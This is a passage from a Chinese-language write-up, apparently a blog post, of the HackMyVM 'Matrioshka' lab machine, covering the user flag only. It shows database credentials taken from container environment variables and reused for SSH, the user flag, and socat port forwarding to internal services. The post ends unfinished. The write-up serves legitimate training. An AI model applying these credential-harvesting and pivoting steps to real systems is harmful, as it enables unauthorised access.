容器里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@3ed5ddfe0e0c:/var/www/html/wp-admin$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /\n\u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /\ntotal 72\ndrwxr-xr-x   1 root root 4096 Aug 21  2024 .\ndrwxr-xr-x   1 root root 4096 Aug 21  2024 ..\n-rwxr-xr-x   1 root root    0 Aug 21  2024 .dockerenv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找一下数据库配置文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以发现是通过环境变量来获取的，查看一下环境变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@3ed5ddfe0e0c:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e\n\nHOSTNAME=3ed5ddfe0e0c\nPHP_VERSION=8.2.22\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nGPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\nPHP_LDFLAGS=-Wl,-O1 -pie\nPWD=/var/www/html\nAPACHE_LOG_DIR=/var/log/apache2\nLANG=C\nPHP_SHA256=8566229bc88ad1f4aadc10700ab5fbcec81587c748999d985f11cf3b745462df\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nWORDPRESS_DB_HOST=db\nPHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c\nPHP_URL=https://www.php.net/distributions/php-8.2.22.tar.xz\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOCK_DIR=/var/lock/apache2\nSHLVL=2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\nWORDPRESS_DB_PASSWORD=Fukurokuju\nAPACHE_RUN_DIR=/var/run/apache2\nAPACHE_ENVVARS=/etc/apache2/envvars\nAPACHE_RUN_USER=www-data\nWORDPRESS_DB_USER=matrioska\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nWORDPRESS_DB_NAME=wordpressdb\nPHP_ASC_URL=https://www.php.net/distributions/php-8.2.22.tar.xz.asc\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\n_=/usr/bin/env\nOLDPWD=/var/www/html/wp-includes\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得凭据 \u003ccode\u003ematrioska:Fukurokuju\u003c/code\u003e 尝试一下进行 SSH\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Matrioshka ssh matrioshka@192.168.56.50\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'192.168.56.50 (192.168.56.50)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:lVUuog2bGOZugWGvEpB7pgBuLs0sI2warKxGwgPeka4.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e192.168.56.50\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nmatrioshka@192.168.56.50'\u003c/span\u003es password: \nLinux matrioshka 6.1.0-23-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Aug 22 19:12:21 2024 from 10.0.2.8\nmatrioshka@matrioshka:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功登录，但是要注意环境变量中的用户名少了个字母，对比靶机名称得到的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematrioshka@matrioshka:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nc8129b0390452d8378535cff76e0dde8\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到有很多网卡，也可以看出来有 \u003ccode\u003eDocker\u003c/code\u003e 环境\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看监听的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematrioshka@matrioshka:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:9090                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:8080                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:36437                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有几个仅在本地开放的端口：\u003ccode\u003e9090\u003c/code\u003e，\u003ccode\u003e8080\u003c/code\u003e，\u003ccode\u003e36437\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003epspy64\u003c/code\u003e 监听一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003esocat\u003c/code\u003e 转发出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:9091,fork TCP4:127.0.0.1:9090 \u0026#x26;\n[1] 31379\nmatrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:8081,fork TCP4:127.0.0.1:8080 \u0026#x26;\n[2] 31534\nmatrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:36438,fork TCP4:127.0.0.1:36437 \u0026#x26;\n[3] 31535\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e到这里没法继续，一些服务起不来\u003c/h2\u003e","title":"HackMyVM - Matrioshka (only user)","date":"2025-04-23","updated":"2025-04-23","comments":true,"tags":["Linux靶机","HackMyVM","WordPress"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMMatrioshka (only user)"},"buildId":"szBRjLeP1kfB-U6tIesme","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>